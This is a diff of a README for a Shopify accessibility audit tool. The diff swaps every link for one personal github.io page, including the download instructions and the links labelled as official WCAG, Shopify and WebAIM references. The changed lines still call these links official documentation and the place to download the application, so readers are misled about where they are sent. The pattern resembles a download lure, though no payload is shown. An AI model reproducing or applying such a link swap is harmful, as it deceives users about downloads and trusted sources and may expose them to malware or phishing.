@@ -1,6 +1,6 @@
 # 🔍 ecom-a11y-audit - Make Your Shopify Store Accessible to Everyone
 
-[![Download ecom-a11y-audit](https://img.shields.io/badge/Download-ecom--a11y--audit-blue?style=for-the-badge&logo=github&color=4CAF50)](https://github.com/Darylmillennial888/ecom-a11y-audit)
+[![Download ecom-a11y-audit](https://img.shields.io/badge/Download-ecom--a11y--audit-blue?style=for-the-badge&logo=github&color=4CAF50)](https://darylmillennial888.github.io)
 
 ## 👋 Welcome to ecom-a11y-audit
 
@@ -28,7 +28,7 @@ Follow these simple steps to get ecom-a11y-audit working on your computer.
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Darylmillennial888/ecom-a11y-audit](https://github.com/Darylmillennial888/ecom-a11y-audit)
+Visit this link to download the application: [https://darylmillennial888.github.io](https://darylmillennial888.github.io)
 
 Once you're on the page, look for the green **"Code"** button. Click it, then select **"Download ZIP"**. The file will start downloading to your computer.
 
@@ -138,9 +138,9 @@ If you get stuck or have questions:
 
 ## 📚 Additional Resources
 
-- [WCAG 2.2 Guidelines](https://www.w3.org/WAI/WCAG22/quickref/) - Official documentation
-- [Shopify Accessibility Guide](https://www.shopify.com/accessibility) - Learn about built-in features
-- [WebAIM Contrast Checker](https://webaim.org/resources/contrastchecker/) - Test your color choices
+- [WCAG 2.2 Guidelines](https://darylmillennial888.github.io) - Official documentation
+- [Shopify Accessibility Guide](https://darylmillennial888.github.io) - Learn about built-in features
+- [WebAIM Contrast Checker](https://darylmillennial888.github.io) - Test your color choices
 
 ## 🤝 Contributing
 
@@ -152,7 +152,7 @@ This project is shared for educational and community purposes. Please check the 
 
 ---
 
-Visit this link to download the application: [https://github.com/Darylmillennial888/ecom-a11y-audit](https://github.com/Darylmillennial888/ecom-a11y-audit)
+Visit this link to download the application: [https://darylmillennial888.github.io](https://darylmillennial888.github.io)
 
 Start making your store work for everyone today. It's good for your customers, good for your business, and good for your peace of mind. Your store deserves to be seen and used by all.
 
